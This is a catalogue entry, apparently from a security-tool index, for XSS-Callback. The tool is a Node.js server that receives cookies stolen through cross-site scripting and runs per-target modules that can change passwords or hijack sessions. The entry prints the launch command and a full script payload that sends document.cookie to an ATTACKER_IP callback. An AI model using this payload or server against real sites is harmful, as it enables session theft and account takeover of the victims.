---
name: "xss-callback-git"
categories:
  - webapp
version: "r14.6a2bb85"
homepage: "https://github.com/PaulSec/XSS-Callback"
origin: "archstrike"
recipe: "archstrike-pkgbuild"
packaged-by: [archstrike]
build-system: node
license: MIT
meta-checked: "2026-11-09"
github-repo: "PaulSec/XSS-Callback"
github-stars: 11
github-pushed: "2014-03-12"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 1.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# xss-callback-git

> Event-driven HTTP server that turns a reflected XSS callback into an automated attack against the victim's session.

## What it's for

XSS-Callback is a small Node.js server (2014-era) that replaces the classic "harvest cookies into a file" XSS setup: when a victim's browser is steered to `/cookie/<value>` on the attacker's server, the request itself triggers a custom offensive module whose `exploit` function receives the victim's cookie (`req.params.cookie`) and can act immediately — change the password, kill the session, or make authenticated requests using the stolen session. You write one module per target application (a `template.js` example ships in the `module/` folder), start the server with that module, and deliver a payload that redirects victims to it. It is a single-purpose exploitation helper: it does not find XSS and it is not a collection platform beyond the one callback URL.

## Typical use cases

### Start the callback server with an attack module

Launch the server bound to a custom module and port.

```
node server.js ./module/my-module.js 8080
```

Outcome: the server listens on port 8080 (the default when omitted) and the usage line is printed if the module argument is missing; once running, every hit on `/cookie/<data>` invokes the module's `exploit` function with the victim's data.

### Deliver the payload that feeds the callback

Inject the redirect that routes each victim's session to the listener.

```
<script>document.location='http://ATTACKER_IP:8080/cookie/'+document.cookie</script>
```

Outcome: when the stored/reflected XSS fires in a victim's browser, their cookie travels to the callback URL, the console logs the incoming victim, and the module executes with `req.params.cookie` holding the victim's session — no manual cookie-file reading in between.

No corpus evidence — derived from upstream documentation.
